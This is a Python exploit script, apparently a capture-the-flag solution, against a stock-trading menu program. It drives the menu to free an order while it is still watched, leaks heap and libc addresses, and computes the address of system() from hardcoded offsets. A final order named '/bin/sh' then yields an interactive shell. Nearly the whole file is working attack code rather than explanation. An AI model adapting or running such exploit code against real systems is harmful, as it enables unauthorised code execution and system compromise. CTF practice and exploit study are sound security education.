import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

# fill index 0
print(p.readuntil('Trading'))
p.sendline('1')
print(p.readuntil('Symbol?:'))
p.sendline('ABCD')
print(p.readuntil('Sell'))
p.sendline('1')
print(p.readuntil('Price:'))
p.sendline('100')

# dummy order
print(p.readuntil('Trading'))
p.sendline('1')
print(p.readuntil('Symbol?:'))
p.sendline('ABCD')
print(p.readuntil('Sell'))
p.sendline('1')
print(p.readuntil('Price:'))
p.sendline('100')


# set autowatch
print(p.readuntil('Trading'))
p.sendline('4')
print(p.readuntil('watch?'))
p.sendline('1')

# remove order
print(p.readuntil('Trading'))
p.sendline('3')
print(p.readuntil('remove:'))
p.sendline('1')

# create bad sl order
print(p.readuntil('Trading'))
p.sendline('2')
print(p.readuntil('Symbol:'))
p.sendline('ABCD')
print(p.readuntil('Sell'))
p.sendline('3')
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
data = p.readline()
print(data)
print_sl_order = data.strip().split(" ")[-1]
print(print_sl_order)

debugStock = int(print_sl_order) + 582

# remove order
print(p.readuntil('Trading'))
p.sendline('3')
print(p.readuntil('remove:'))
p.sendline('1')

# dump debug info for RET2
print(p.readuntil('Trading'))
p.sendline('2')
print(p.readuntil('Symbol:'))
p.sendline('RET2')
print(p.readuntil('Sell'))
p.sendline('1')
print(p.readuntil('Stop:'))
p.sendline('0')
print(p.readuntil('Limit:'))
p.sendline(str(debugStock))
print(p.readuntil('=== Info Functions ==='))

print(p.readline())
data = p.readline()
print(data)
nameFunc = data.strip().split(" ")[-1]
print(nameFunc)

data = p.readline()
print(data)
priceFunc = data.strip().split(" ")[-1]
print(priceFunc)

libc_base = int(nameFunc) - 0x6f690
system = libc_base + 0x45390

# remove order
print(p.readuntil('Trading'))
p.sendline('3')
print(p.readuntil('remove:'))
p.sendline('1')

# get shell
print(p.readuntil('Trading'))
p.sendline('2')
print(p.readuntil('Symbol:'))
p.sendline('/bin/sh')
print(p.readuntil('Sell'))
p.sendline('1')
print(p.readuntil('Stop:'))
p.sendline('0')
print(p.readuntil('Limit:'))
p.sendline(str(system))

p.interactive()
